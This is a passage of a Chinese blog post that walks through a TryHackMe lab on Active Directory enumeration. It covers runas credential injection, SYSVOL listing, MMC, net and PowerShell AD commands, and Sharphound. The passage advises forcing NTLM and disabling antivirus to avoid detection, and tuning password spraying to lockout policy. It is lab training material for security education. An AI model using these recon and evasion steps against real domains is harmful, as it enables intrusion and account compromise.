Username&gt;@thmjmp1.za.tryhackme.com</span><br></pre></td></tr></table></figure><p>RDP连接，<code>/drive:.,kali-share</code>选项将允许您将<strong>当前工作目录</strong>作为 RDP 会话中的网络驱动器安装，以便您可以上传和下载文件。</p><p>该<code>+clipboard</code>选项允许在目标之间复制和粘贴。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xfreerdp /d:za.tryhackme.com /u:&#x27;user.name&#x27; /p:&#x27;password&#x27; /v:thmjmp1.za.tryhackme.com /drive:.,kali-share +clipboard</span><br></pre></td></tr></table></figure><h5 id="凭证注入">凭证注入</h5><p>若我们找到AD凭证，但没有加入域的主机立足点，我们可以使用一些工具在未加入域的主机上立足时利用域凭据。</p><p>如果我们拥有&lt;用户名&gt;:&lt;密码&gt; 格式的AD凭据，则可以使用合法的 Windows 二进制文件 Runas 将凭据注入内存。通常的 Runas 命令如下所示：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">runas.exe /netonly /user:domain.tld\username cmd.exe</span><br></pre></td></tr></table></figure><ul><li><code>/netonly</code>- 仅使用网络会话的凭据，所有其他命令都在本地主机上的当前用户会话中运行</li><li><code>/user</code>- 我们想要在网络会话中验证的用户</li><li><code>cmd.exe</code>使用注入的网络凭证生成一个新的命令提示符窗口</li></ul><p>输入密码后，将打开一个新的命令提示符窗口。现在我们仍然需要验证我们的凭据是否有效。最可靠的方法是列出 SYSVOL。任何AD帐户，无论权限多低，都可以读取 SYSVOL 目录的内容。</p><p>SYSVOL 是存在于所有域控制器上的文件夹。它是一个共享文件夹，存储组策略对象 (GPO) 和信息以及任何其他域相关脚本。它是 Active Directory 的重要组成部分，因为它将这些 GPO 传递给域中的所有计算机。加入域的计算机可以读取这些 GPO 并应用适用的 GPO，从中心位置进行域范围的配置更改。</p><p>在列出 SYSVOL 之前，我们需要配置 DNS 。有时您很幸运，内部DNS将通过 DHCP 或 VPN 连接自动为您配置，但并非总是如此,对于DNS服务器来说，最安全的选择通常是域控制器。使用域控制器的 IP，我们可以在PowerShell窗口中执行以下命令：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$dnsip = &quot;&lt;DC IP&gt;&quot;</span><br><span class="line">$index = Get-NetAdapter -Name &#x27;Ethernet&#x27; | Select-Object -ExpandProperty &#x27;ifIndex&#x27;</span><br><span class="line">Set-DnsClientServerAddress -InterfaceIndex $index -ServerAddresses $dnsip</span><br></pre></td></tr></table></figure><p>通过运行以下命令来验证DNS是否正常工作：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:\&gt; nslookup za.tryhackme.com</span><br></pre></td></tr></table></figure><p>现在应该解析为 DC IP，因为这是托管 FQDN 的位置。现在DNS正在运行，我们终于可以测试我们的凭据了。我们可以使用以下命令强制基于网络列出 SYSVOL 目录：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">C:\Tools&gt;dir \\za.tryhackme.com\SYSVOL\</span><br><span class="line"> Volume in drive \\za.tryhackme.com\SYSVOL is Windows</span><br><span class="line"> Volume Serial Number is 1634-22A9</span><br><span class="line"></span><br><span class="line"> Directory of \\za.tryhackme.com\SYSVOL</span><br><span class="line"></span><br><span class="line">02/24/2022  09:57 PM    &lt;DIR&gt;          .</span><br><span class="line">02/24/2022  09:57 PM    &lt;DIR&gt;          ..</span><br><span class="line">02/24/2022  09:57 PM    &lt;JUNCTION&gt;     za.tryhackme.com [C:\Windows\SYSVOL\domain]</span><br><span class="line">               0 File(s)              0 bytes</span><br><span class="line">               3 Dir(s)  51,835,408,384 bytes free</span><br></pre></td></tr></table></figure><p>我们现在不会深入探讨 SYSVOL 的内容，但请注意，枚举其内容也是有好处的，因为其中可能隐藏着一些额外的AD凭据。</p><blockquote><p><code>dir \\za.tryhackme.com\SYSVOL</code>和<code>dir \\&lt;DC IP&gt;\SYSVOL</code>之间有区别吗？</p><p>它们之间存在相当大的差异，归根结底取决于所使用的身份验证方法。当我们提供主机名时，网络身份验证将首先尝试执行 Kerberos 身份验证。由于 Kerberos 身份验证使用嵌入在票证中的主机名，如果我们改为提供 IP，则可以强制将身份验证类型设置为NTLM。虽然从表面上看，这对我们来说现在并不重要，但了解这些细微的差别是有益的，因为它们可以让你在红队评估期间保持更隐秘。在某些情况下，组织将监控 OverPass 和 Pass-The-Hash 攻击。在这些情况下，强制使用NTLM身份验证是避免被发现的好技巧。</p></blockquote><h5 id="通过microsoft管理控制台进行枚举">通过Microsoft管理控制台进行枚举</h5><p>需要使用GUI(RDP连接)，我们将使用 Microsoft 管理控制台 (MMC) 和<a href="https://docs.microsoft.com/en-us/powershell/module/activedirectory/?view=windowsserver2022-ps">远程服务器管理工具</a>(RSAT) AD 管理单元。如果您使用自己的 Windows 计算机，则可以执行以下步骤来安装管理单元:</p><ol><li>按 <strong>Start</strong></li><li>搜索 <strong>“Apps &amp; Features”</strong> 并按 Enter</li><li>点击 <strong>Manage Optional Features</strong></li><li>点击 <strong>Add a feature</strong></li><li>搜索 <strong>&quot;RSAT&quot;</strong></li><li>选择 &quot;<strong>RSAT: Active Directory Domain Services and Lightweight Directory Tools&quot;</strong> 单机 <strong>Install</strong></li></ol><p>您可以使用 Windows 开始按钮、搜索运行并输入 MMC 来启动 MMC。如果我们只是正常运行 MMC，它将无法工作，因为我们的计算机未加入域，并且我们的本地帐户无法用于对域进行身份验证。</p><p><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/6093e17fa004d20049b6933e/room-content/dd93acc5bf807d120eb083d2250e77ef.png" alt="MMC 因凭证而无法启动"></p><p>这时上一个任务中的 Runas 窗口就会发挥作用。在该窗口中，我们可以启动 MMC，这将确保所有 MMC 网络连接都将使用我们注入的AD凭据。</p><p>在 MMC 中，我们现在可以附加AD RSAT 管理单元：</p><ol><li>单击<strong>文件</strong>-&gt;<strong>添加/删除管理单元</strong></li><li>选择并<strong>添加</strong>所有三个 Active Directory 管理单元</li><li>点击任何错误和警告</li><li>右键单击**“Active Directory 域和信任”<strong>，然后选择</strong>“更改林”**</li><li>输入<em><a href="http://za.tryhackme.com">za.tryhackme.com</a></em>作为<strong>根域</strong>，然后单击**“确定”**</li><li>右键单击**“Active Directory 站点和服务”<strong>，然后选择</strong>“更改林”**</li><li>输入<em><a href="http://za.tryhackme.com">za.tryhackme.com</a></em>作为<strong>根域</strong>，然后单击“确定”</li><li>右键单击**“Active Directory 用户和计算机”<strong>，然后选择</strong>“更改域”**</li><li>输入<em><a href="http://za.tryhackme.com">za.tryhackme.com</a></em>作为<strong>域名</strong>，然后单击**“确定”**</li><li>右键单击左侧窗格中的**“Active Directory 用户和计算机”**</li><li>点击<strong>查看</strong>-&gt;<strong>高级功能</strong></li></ol><p>如果到目前为止一切正常，您的 MMC 现在应该指向目标域并针对该目标域进行身份验证：</p><p><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/6093e17fa004d20049b6933e/room-content/da8bba5a4df58baf0045d4a71db37e05.png" alt="MMC AD 管理单元"></p><p>现在我们可以开始列举有关AD结构的信息。</p><p><strong>用户和计算机</strong></p><p>让我们看一下 Active Directory 结构。对于此任务，我们将重点关注 AD 用户和计算机。展开该管理单元并展开 za 域以查看初始组织单位 ( OU ) 结构：</p><p><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/6093e17fa004d20049b6933e/room-content/a5fc9efbd6a77ee9ea72a25d7ba13240.png" alt="MMC AD 管理单元"></p><p>我们来看看人员目录。在这里，我们可以看到用户按照部门 OU 进行划分。单击每个 OU 将显示属于该部门的用户。</p><p><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/6093e17fa004d20049b6933e/room-content/993c161b6d86d61bf5ecc31a0ce0fa54.png" alt="MMC AD 管理单元"></p><p>单击任何用户，我们都可以查看他们的所有属性和特性。我们还可以看到他们属于哪些组：</p><p><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/6093e17fa004d20049b6933e/room-content/659127fd61749667192a19e0fb71ad55.png" alt="MMC AD 管理单元"></p><p>我们还可以使用 MMC 查找环境中的主机。如果我们单击“服务器”或“工作站”，则会显示已加入域的计算机列表。</p><p><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/6093e17fa004d20049b6933e/room-content/9e353f21616effb4a9cca2f3e86e65ad.png" alt="MMC AD 管理单元"></p><p>如果我们拥有相关权限，我们还可以使用 MMC 直接对 AD 进行更改，例如更改用户密码或将帐户添加到特定组。使用 MMC 进行尝试以更好地了解AD域结构。利用搜索功能查找对象。</p><p><strong>好处</strong>：</p><ul><li>GUI提供了一种获得AD环境整体视图的绝佳方法。</li><li>可以快速搜索不同的AD对象。</li><li>它提供了一种直接的方法来查看AD对象的具体更新。</li><li>如果我们有足够的权限，我们可以直接更新现有的AD对象或添加新的对象。</li></ul><p><strong>缺点</strong></p><ul><li>GUI需要通过RDP访问执行它的机器。</li><li>虽然搜索对象很快，但无法收集AD范围的属性或特性。</li></ul><h5 id="通过命令提示符枚举">通过命令提示符枚举</h5><p>CMD 有一个内置命令，我们可以使用它来枚举有关AD 的信息，即<code>net</code>。该<code>net</code>命令是一个方便的工具，可以枚举有关本地系统和AD 的信息。</p><p><strong>用户</strong></p><p>我们可以使用该命令通过使用子选项<code>net</code>列出AD域中的所有用户：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">C:\&gt;net user /domain</span><br><span class="line">The request will be processed at a domain controller for domain za.tryhackme.com</span><br><span class="line"></span><br><span class="line">User accounts for \\THMDC</span><br><span class="line"></span><br><span class="line">-------------------------------------------------------------------------------</span><br><span class="line">aaron.conway             aaron.hancock            aaron.harris</span><br><span class="line">aaron.johnson            aaron.lewis              aaron.moore</span><br><span class="line">aaron.patel              aaron.smith              abbie.joyce</span><br><span class="line">abbie.robertson          abbie.taylor             abbie.walker</span><br><span class="line">abdul.akhtar             abdul.bates              abdul.holt</span><br><span class="line">abdul.jones              abdul.wall               abdul.west</span><br><span class="line">abdul.wilson             abigail.cox              abigail.cox1</span><br><span class="line">abigail.smith            abigail.ward             abigail.wheeler</span><br><span class="line">[....]</span><br><span class="line">The command completed successfully.</span><br></pre></td></tr></table></figure><p>这将返回所有AD用户，有助于确定域的大小以发起进一步的攻击。我们还可以使用此子选项枚举有关单个用户帐户的更详细信息：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">C:\&gt;net user zoe.marshall /domain</span><br><span class="line">The request will be processed at a domain controller for domain za.tryhackme.com</span><br><span class="line"></span><br><span class="line">User name                    zoe.marshall</span><br><span class="line">Full Name                    Zoe Marshall</span><br><span class="line">Comment</span><br><span class="line">User&#x27;s comment</span><br><span class="line">Country/region code          000 (System Default)</span><br><span class="line">Account active               Yes</span><br><span class="line">Account expires              Never</span><br><span class="line"></span><br><span class="line">Password last set            2/24/2022 10:06:06 PM</span><br><span class="line">Password expires             Never</span><br><span class="line">Password changeable          2/24/2022 10:06:06 PM</span><br><span class="line">Password required            Yes</span><br><span class="line">User may change password     Yes</span><br><span class="line"></span><br><span class="line">Workstations allowed         All</span><br><span class="line">Logon script</span><br><span class="line">User profile</span><br><span class="line">Home directory</span><br><span class="line">Last logon                   Never</span><br><span class="line"></span><br><span class="line">Logon hours allowed          All</span><br><span class="line"></span><br><span class="line">Local Group Memberships</span><br><span class="line">Global Group memberships     *Domain Users         *Internet Access</span><br><span class="line">The command completed successfully.</span><br></pre></td></tr></table></figure><p>**注意：**如果用户只是少数AD组的一部分，此命令将能够显示组成员身份。但是，通常，超过十个组成员身份后，该命令将无法全部列出。</p><p><strong>群组</strong></p><p>我们可以使用该<code>net</code>命令通过使用子选项来枚举域的组<code>group</code>：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">C:\&gt;net group /domain</span><br><span class="line">The request will be processed at a domain controller for domain za.tryhackme.com</span><br><span class="line"></span><br><span class="line">Group Accounts for \\THMDC</span><br><span class="line"></span><br><span class="line">-------------------------------------------------------------------------------</span><br><span class="line">*Cloneable Domain Controllers</span><br><span class="line">*DnsUpdateProxy</span><br><span class="line">*Domain Admins</span><br><span class="line">*Domain Computers</span><br><span class="line">*Domain Controllers</span><br><span class="line">*Domain Guests</span><br><span class="line">*Domain Users</span><br><span class="line">[...]</span><br><span class="line">*Schema Admins</span><br><span class="line">*Server Admins</span><br><span class="line">*Tier 0 Admins</span><br><span class="line">*Tier 1 Admins</span><br><span class="line">*Tier 2 Admins</span><br><span class="line">The command completed successfully.</span><br></pre></td></tr></table></figure><p>这些信息可以帮助我们找到要执行目标的特定组。我们还可以在同一命令中指定组来枚举更多详细信息，例如组成员身份：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">C:\&gt;net group &quot;Tier 1 Admins&quot; /domain</span><br><span class="line">The request will be processed at a domain controller for domain za.tryhackme.com</span><br><span class="line"></span><br><span class="line">Group name     Tier 1 Admins</span><br><span class="line">Comment</span><br><span class="line"></span><br><span class="line">Members</span><br><span class="line"></span><br><span class="line">-------------------------------------------------------------------------------</span><br><span class="line">t1_arthur.tyler          t1_gary.moss             t1_henry.miller</span><br><span class="line">t1_jill.wallis           t1_joel.stephenson       t1_marian.yates</span><br><span class="line">t1_rosie.bryant</span><br><span class="line">The command completed successfully.</span><br></pre></td></tr></table></figure><p><strong>密码策略</strong></p><p>我们可以使用该命令通过使用子选项<code>net</code>来枚举域的密码策略：<code>accounts</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">C:\&gt;net accounts /domain</span><br><span class="line">The request will be processed at a domain controller for domain za.tryhackme.com</span><br><span class="line"></span><br><span class="line">Force user logoff how long after time expires?:       Never</span><br><span class="line">Minimum password age (days):                          0</span><br><span class="line">Maximum password age (days):                          Unlimited</span><br><span class="line">Minimum password length:                              0</span><br><span class="line">Length of password history maintained:                None</span><br><span class="line">Lockout threshold:                                    Never</span><br><span class="line">Lockout duration (minutes):                           30</span><br><span class="line">Lockout observation window (minutes):                 30</span><br><span class="line">Computer role:                                        PRIMARY</span><br><span class="line">The command completed successfully.</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>这将为我们提供有用的信息，例如：</p><ul><li>密码历史记录保存的长度。这意味着用户必须提供多少个唯一密码才能重新使用旧密码。</li><li>密码尝试错误时的锁定阈值以及帐户被锁定的时间。</li><li>密码的最小长度。</li><li>密码允许达到的最长期限指示是否必须定期轮换密码。</li></ul><p>如果我们想对现在已枚举的其他用户帐户发起额外的密码喷洒攻击，这些信息将对我们大有裨益。它可以帮助我们更好地猜测在攻击中应该使用哪些密码，以及在冒着锁定帐户的风险之前可以进行多少次攻击。但是，应该注意的是，如果我们执行盲密码喷洒攻击，我们可能会锁定帐户，因为我们没有检查以确定该特定帐户在被锁定之前还剩下多少次尝试。</p><p><a href="https://docs.microsoft.com/en-us/troubleshoot/windows-server/networking/net-commands-on-operating-systems">您可以在此处</a>找到与 net 命令相关的所有选项。使用这些 net 命令来收集有关特定用户和组的信息。</p><p><strong>好处</strong></p><ul><li>不需要额外或外部工具，并且这些简单的命令通常不会被蓝队监控。</li><li>我们不需要GUI来进行此枚举。</li><li>VBScript 和其他常用于网络钓鱼负载的宏语言本身支持这些命令，因此可以在制作更具体的负载之前使用它们来枚举有关AD域的初始信息。</li></ul><p><strong>缺点</strong></p><ul><li>必须从已加入域的计算机执行这些<code>net</code>命令。如果计算机未加入域，则它将默认为 WORKGROUP 域。</li><li>命令<code>net</code>可能不会显示所有信息。例如，如果用户是十多个组的成员，则输出中不会显示所有这些组。</li></ul><h5 id="通过powershell枚举">通过PowerShell枚举</h5><p>PowerShell 是命令提示符的升级版。不仅具有命令提示符提供的所有标准功能，还提供了对 cmdlet（发音为 command-lets）的访问，这些 cmdlet 是用于执行特定功能的 .NET 类。虽然我们可以像<a href="https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerView">PowerView</a>的创建者一样编写自己的 cmdlet，但使用内置的 cmdlet 已经可以取得很大进展。</p><p>由于我们在任务 3 中安装了 AD-RSAT 工具，它会自动为我们安装相关的 cmdlet。安装了 50 多个 cmdlet。我们将查看其中的一些，但请参阅<a href="https://docs.microsoft.com/en-us/powershell/module/activedirectory/?view=windowsserver2022-ps">此列表以获取完整的 cmdlet 列表。</a></p><p>使用我们的 SSH 终端，我们可以使用以下命令将其升级为PowerShell终端：<code>powershell</code></p><p><strong>user</strong></p><p>我们可以使用<code>Get-ADUser</code>cmdlet 来枚举AD用户：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">PS C:\&gt; Get-ADUser -Identity gordon.stevens -Server za.tryhackme.com -Properties *</span><br><span class="line"></span><br><span class="line">AccountExpirationDate                :</span><br><span class="line">accountExpires                       : 9223372036854775807</span><br><span class="line">AccountLockoutTime                   :</span><br><span class="line">[...]</span><br><span class="line">Deleted                              :</span><br><span class="line">Department                           : Consulting</span><br><span class="line">Description                          :</span><br><span class="line">DisplayName                          : Gordon Stevens</span><br><span class="line">DistinguishedName                    : CN=gordon.stevens,OU=Consulting,OU=People,DC=za,DC=tryhackme,DC=com</span><br><span class="line">[...]</span><br></pre></td></tr></table></figure><p>这些参数的用途如下：</p><ul><li>-Identity：我们正在枚举的帐户名称</li><li>-Properties：将显示与帐户相关的哪些属性，* 将显示所有属性</li><li>-Server ：由于我们没有加入域，我们必须使用此参数将其指向我们的域控制器</li></ul><p>对于大多数这些 cmdlet，我们还可以使用<code> -Filter</code>允许更好地控制枚举的参数，并使用 cmdlet<code>Format-Table</code>整齐地显示如下所示的结果：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">PS C:\&gt; Get-ADUser -Filter &#x27;Name -like &quot;*stevens&quot;&#x27; -Server za.tryhackme.com | Format-Table Name,SamAccountName -A</span><br><span class="line"></span><br><span class="line">Name             SamAccountName</span><br><span class="line">----             --------------</span><br><span class="line">chloe.stevens    chloe.stevens</span><br><span class="line">samantha.stevens samantha.stevens</span><br><span class="line">[...]</span><br><span class="line">janice.stevens   janice.stevens</span><br><span class="line">gordon.stevens   gordon.stevens</span><br></pre></td></tr></table></figure><p><strong>群组</strong></p><p>我们可以使用<code>Get-ADGroup</code>cmdlet 来枚举AD组：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">PS C:\&gt; Get-ADGroup -Identity Administrators -Server za.tryhackme.com</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">DistinguishedName : CN=Administrators,CN=Builtin,DC=za,DC=tryhackme,DC=com</span><br><span class="line">GroupCategory     : Security</span><br><span class="line">GroupScope        : DomainLocal</span><br><span class="line">Name              : Administrators</span><br><span class="line">ObjectClass       : group</span><br><span class="line">ObjectGUID        : f4d1cbcd-4a6f-4531-8550-0394c3273c4f</span><br><span class="line">SamAccountName    : Administrators</span><br><span class="line">SID               : S-1-5-32-544</span><br></pre></td></tr></table></figure><p>我们还可以使用<code>Get-ADGroupMember</code>cmdlet 枚举组成员身份：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">PS C:\&gt; Get-ADGroupMember -Identity Administrators -Server za.tryhackme.com</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">distinguishedName : CN=Domain Admins,CN=Users,DC=za,DC=tryhackme,DC=com</span><br><span class="line"></span><br><span class="line">name              : Domain Admins</span><br><span class="line">objectClass       : group</span><br><span class="line">objectGUID        : 8a6186e5-e20f-4f13-b1b0-067f3326f67c</span><br><span class="line">SamAccountName    : Domain Admins</span><br><span class="line">SID               : S-1-5-21-3330634377-1326264276-632209373-512</span><br><span class="line"></span><br><span class="line">[...]</span><br><span class="line"></span><br><span class="line">distinguishedName : CN=Administrator,CN=Users,DC=za,DC=tryhackme,DC=com name              : Administrator</span><br><span class="line">objectClass       : user</span><br><span class="line">objectGUID        : b10fe384-bcce-450b-85c8-218e3c79b30fSamAccountName    : Administrator</span><br><span class="line">SID               : S-1-5-21-3330634377-1326264276-632209373-500</span><br></pre></td></tr></table></figure><p><strong>AD Objects</strong></p><p>可以使用cmdlet 对任何AD对象进行更通用的搜索<code>Get-ADObject</code>。例如，如果我们要查找特定日期之后更改的所有AD对象：：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">PS C:\&gt; $ChangeDate = New-Object DateTime(2022, 02, 28, 12, 00, 00)</span><br><span class="line">PS C:\&gt; Get-ADObject -Filter &#x27;whenChanged -gt $ChangeDate&#x27; -includeDeletedObjects -Server za.tryhackme.com</span><br><span class="line"></span><br><span class="line">Deleted           :</span><br><span class="line">DistinguishedName : DC=za,DC=tryhackme,DC=com</span><br><span class="line">Name              : za</span><br><span class="line">ObjectClass       : domainDNS</span><br><span class="line">ObjectGUID        : 518ee1e7-f427-4e91-a081-bb75e655ce7a</span><br><span class="line"></span><br><span class="line">Deleted           :</span><br><span class="line">DistinguishedName : CN=Administrator,CN=Users,DC=za,DC=tryhackme,DC=com</span><br><span class="line">Name              : Administrator</span><br><span class="line">ObjectClass       : user</span><br><span class="line">ObjectGUID        : b10fe384-bcce-450b-85c8-218e3c79b30f</span><br></pre></td></tr></table></figure><p>例如，如果我们想要在不锁定账户的情况下执行密码喷洒攻击，我们可以使用它来枚举 badPwdCount 大于 0 的账户，以避免这些账户受到攻击：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">PS C:\&gt; Get-ADObject -Filter &#x27;badPwdCount -gt 0&#x27; -Server za.tryhackme.com</span><br><span class="line">PS C:\&gt;</span><br></pre></td></tr></table></figure><p>仅当网络中的一个用户多次输入错误密码时，才会显示结果。</p><p><strong>域</strong></p><p>我们可以用来<code>Get-ADDomain</code>检索有关特定域的其他信息：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">PS C:\&gt; Get-ADDomain -Server za.tryhackme.com</span><br><span class="line"></span><br><span class="line">AllowedDNSSuffixes                 : &#123;&#125;</span><br><span class="line">ChildDomains                       : &#123;&#125;</span><br><span class="line">ComputersContainer                 : CN=Computers,DC=za,DC=tryhackme,DC=com</span><br><span class="line">DeletedObjectsContainer            : CN=Deleted Objects,DC=za,DC=tryhackme,DC=com</span><br><span class="line">DistinguishedName                  : DC=za,DC=tryhackme,DC=com</span><br><span class="line">DNSRoot                            : za.tryhackme.com</span><br><span class="line">DomainControllersContainer         : OU=Domain Controllers,DC=za,DC=tryhackme,DC=com</span><br><span class="line">[...]</span><br><span class="line">UsersContainer                     : CN=Users,DC=za,DC=tryhackme,DC=com</span><br></pre></td></tr></table></figure><p><strong>修改AD对象</strong></p><p>AD -RSAT cmdlet的优点在于，有些命令甚至允许您创建新的或更改现有的AD对象。但是，我们对这个网络的关注点是枚举。创建新对象或更改现有对象将被视为AD漏洞利用，这将在AD模块的后面部分介绍。</p><p>但是，我们将通过使用cmdlet 强制更改AD用户的密码来展示此示例<code>Set-ADAccountPassword</code>：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PS C:\&gt; Set-ADAccountPassword -Identity gordon.stevens -Server za.tryhackme.com -OldPassword (ConvertTo-SecureString -AsPlaintext &quot;old&quot; -force) -NewPassword (ConvertTo-SecureString -AsPlainText &quot;new&quot; -Force)</span><br></pre></td></tr></table></figure><p><strong>好处</strong></p><ul><li>PowerShell cmdlet 可以枚举比命令提示符中的net 命令多得多的信息。</li><li>我们可以指定服务器和域，从未加入域的机器上使用 runas 执行这些命令。</li><li>我们可以创建自己的 cmdlet 来枚举特定信息。</li><li>我们可以使用AD -RSAT cmdlet 直接更改AD对象，例如重置密码或将用户添加到特定组。</li></ul><p><strong>缺点</strong></p><ul><li>与命令提示符相比， PowerShell往往受到蓝队的更多监控。</li><li>我们必须安装 AD-RSAT 工具或使用其他可能可检测的脚本进行PowerShell枚举。</li></ul><h5 id="通过bloodhound枚举">通过Bloodhound枚举</h5><p>Bloodhound 是迄今为止最强大的AD枚举工具，Sharphound 是 Bloodhound 的枚举工具。它用于枚举 AD 信息，然后可以在 Bloodhound 中直观显示这些信息。Bloodhound 是用于显示AD攻击图的实际GUI。因此，我们首先需要学习如何使用 Sharphound 枚举AD，然后才能使用 Bloodhound 直观地查看结果。</p><p>Sharphound 有三种不同的类型：</p><ul><li><strong>Sharphound.ps1</strong> -用于运行 Sharphound 的PowerShell脚本。但是，Sharphound 的最新版本已停止发布 Powershell 脚本版本。此版本非常适合与 RAT 一起使用，因为该脚本可以直接加载到内存中，从而避开磁盘上的AV扫描。</li><li>**Sharphound.exe——**用于运行 Sharphound 的 Windows 可执行版本。</li><li><strong>AzureHound.ps1</strong> -用于运行 Sharphound for Azure（Microsoft 云计算服务）实例的PowerShell脚本。Bloodhound 可以提取从 Azure 枚举的数据，以查找与 Azure 身份和访问管理配置相关的攻击路径。</li></ul><blockquote><p>Bloodhound 和 Sharphound 版本必须匹配才能获得最佳结果。通常 Bloodhound 会进行更新，这意味着旧的 Sharphound 结果无法导入。</p></blockquote><p>使用这些脚本时这些文件很有可能被检测为恶意软件并向蓝队发出警报。这时，我们未加入域的 Windows 计算机可以提供帮助。我们可以使用命令<code>runas</code>注入 AD 凭据并将 Sharphound 指向域控制器。由于我们控制这台 Windows 计算机，我们可以禁用 AV或为特定文件或文件夹创建例外，</p><p>我们将按如下方式执行 Sharphound：</p><figure class="highlight plaintext"><table><tr><td 